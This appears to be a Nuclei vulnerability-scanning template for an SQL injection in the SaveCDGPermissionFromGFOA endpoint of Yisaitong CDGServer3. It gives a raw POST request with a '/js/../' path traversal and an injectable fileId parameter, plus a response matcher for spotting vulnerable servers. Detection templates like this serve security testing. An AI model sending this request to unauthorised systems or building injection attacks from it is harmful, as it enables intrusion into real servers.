id: yisaitong-SaveCDGPermissionFromGFOA-sqli

info:
  name: yisaitong-SaveCDGPermissionFromGFOA-sqli
  author: msk
  severity: high





http:
  - raw:


      - |
        POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        fileId=1*&pis=1




    matchers:
      - type: dsl
        dsl:
          - status_code==200  && body=="" && contains_all(all_headers, "CDGServer3","Set-Cookie")


